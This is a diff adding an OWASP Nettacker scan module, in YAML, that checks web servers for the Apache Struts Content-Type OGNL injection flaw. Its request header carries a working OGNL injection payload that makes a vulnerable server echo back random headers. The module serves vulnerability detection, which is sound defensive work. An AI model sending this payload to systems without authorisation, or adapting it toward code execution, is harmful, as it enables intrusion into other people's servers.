@@ -1,0 +1,62 @@
+info:
+  name: apache_struts_vuln
+  author: OWASP Nettacker Team
+  severity: 3
+  description:
+  reference:
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - low_severity
+    - apache_struts
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type:
+            nettacker_fuzzer:
+              input_format: "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader({{random_string}},{{random_string}}"
+              suffix: ")}}.multipart/form-data"
+              prefix: "%{{"
+              interceptors:
+              data:
+                random_string:
+                  - randomstring_xyz_1
+                  - randomstring_xyz_2
+                  - randomstring_xyz_3
+          Accept: "*/*"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: or
+          conditions:
+            headers:
+              randomstring_xyz_1:
+                regex: randomstring_xyz_1
+                reverse: false
+              randomstring_xyz_2:
+                regex: randomstring_xyz_2
+                reverse: false
+              randomstring_xyz_3:
+                regex: randomstring_xyz_3
+                reverse: false
